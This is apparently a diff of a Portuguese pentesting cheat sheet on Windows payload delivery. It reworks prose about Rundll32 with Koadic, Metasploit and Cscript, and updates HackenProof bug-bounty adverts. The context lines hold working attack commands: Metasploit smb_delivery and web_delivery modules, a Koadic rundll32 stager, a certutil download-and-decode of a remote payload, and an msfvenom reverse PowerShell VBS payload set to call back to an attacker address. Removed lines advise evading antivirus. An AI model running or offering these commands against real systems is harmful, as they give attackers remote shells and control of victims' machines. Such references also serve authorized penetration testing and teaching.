-O `rundll32` é uma ferramenta poderosa que pode ser usada para executar payloads maliciosos no Windows. No entanto, é importante lembrar que o uso indevido dessa ferramenta é ilegal e pode resultar em consequências legais graves. Portanto, sempre use essas técnicas apenas para fins educacionais e com permissão adequada.
+O `rundll32` é uma ferramenta poderosa que pode ser usada para executar payloads maliciosos no Windows. No entanto, é importante lembrar que o uso indevido dessa ferramenta é ilegal e pode resultar em consequências legais graves.
 ```bash
 use windows/smb/smb_delivery
 run
@@ -604,25 +456,15 @@ run
 ```
 **Rundll32 - Koadic**
 
-Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by hackers to load malicious DLLs and execute their code. Koadic is a post-exploitation tool that utilizes the Rundll32 technique to establish a command and control channel on a compromised Windows machine.
+Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by hackers to load malicious DLLs and execute their code. One popular tool that utilizes Rundll32 for post-exploitation is Koadic.
 
-To use Rundll32 with Koadic, follow these steps:
+Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command and control (C2) framework for Windows systems. It allows hackers to gain remote access to compromised machines and perform various malicious activities.
 
-1. Generate a payload using Koadic. This payload will be a DLL file containing the malicious code you want to execute on the target machine.
+To use Koadic, the attacker first needs to establish a foothold on the target system. This can be achieved through various means, such as exploiting vulnerabilities, social engineering, or phishing attacks. Once the attacker has gained access, they can use Rundll32 to load the Koadic DLL and establish a connection with the C2 server.
 
-2. Transfer the generated payload to the target machine. This can be done using various methods such as email, USB drives, or exploiting vulnerabilities in other software.
+Once the connection is established, the attacker can remotely control the compromised system and perform actions such as executing commands, uploading and downloading files, capturing screenshots, and even pivoting to other systems on the network.
 
-3. Open a command prompt on the target machine and run the following command to execute the payload using Rundll32:
-
-```
-rundll32.exe <path_to_payload.dll>,<entry_point_function>
-```
-
-Replace `<path_to_payload.dll>` with the path to the transferred payload DLL file, and `<entry_point_function>` with the name of the function within the DLL that you want to execute.
-
-4. Once the payload is executed, Koadic will establish a command and control channel, allowing you to remotely control the compromised machine and perform various post-exploitation activities.
-
-It is important to note that the Rundll32 technique can be detected by antivirus software, so it is crucial to use evasion techniques to bypass detection. Additionally, this technique requires initial access to the target machine, either through a vulnerability or social engineering.
+Koadic provides a wide range of features and modules that can be used for different purposes, making it a powerful tool for post-exploitation activities. However, it is important to note that the use of Koadic or any other hacking tool for unauthorized activities is illegal and unethical. This information is provided for educational purposes only.
 ```bash
 use stager/js/rundll32_js
 set SRVHOST 192.168.1.107
@@ -708,9 +550,11 @@ set LPORT <sua porta>
 exploit
 ```
 
-Certifique-se de substituir `<seu endereço IP>` pelo seu endereço IP real e `<sua porta>` pela porta desejada para a conexão reversa.
+Lembre-se de substituir `<seu endereço IP>` pelo seu endereço IP real e `<sua porta>` pela porta que você deseja usar para a conexão reversa.
 
 Após a execução bem-sucedida do exploit, você terá acesso ao prompt do Meterpreter, que permite executar comandos no sistema alvo e explorar ainda mais a rede comprometida.
+
+É importante ressaltar que o uso de técnicas de hacking como essa é ilegal sem permissão explícita do proprietário do sistema alvo. Portanto, sempre realize testes de penetração em ambientes controlados e com autorização adequada.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -733,9 +577,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 **Detectado pelo defensor**
 
-
-
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof é o lar de todas as recompensas por bugs de criptografia.**
 
@@ -745,10 +587,10 @@ As recompensas do HackenProof são lançadas apenas quando seus clientes deposit
 **Adquira experiência em pentesting web3**\
 Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.
 
-**Torne-se a lenda do hacker web3**\
+**Torne-se uma lenda hacker web3**\
 Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.
 
-[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!
+[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!
 
 {% embed url="https://hackenproof.com/register" %}
 
@@ -780,7 +622,7 @@ Para usar o Cscript com o Metasploit, siga as etapas abaixo:
 
 9. Se tudo correr conforme o esperado, uma conexão reversa será estabelecida entre o sistema alvo e o atacante.
 
-Lembre-se de que o uso de ferramentas e técnicas de hacking é estritamente regulamentado e só deve ser realizado com permissão legal e ética.
+É importante ressaltar que o uso de scripts maliciosos para fins não autorizados é ilegal e pode resultar em consequências legais graves. Este conhecimento deve ser usado apenas para fins educacionais e éticos, como parte de um teste de penetração autorizado.
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
@@ -978,7 +820,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof é o lar de todas as recompensas por bugs de criptografia.**
 
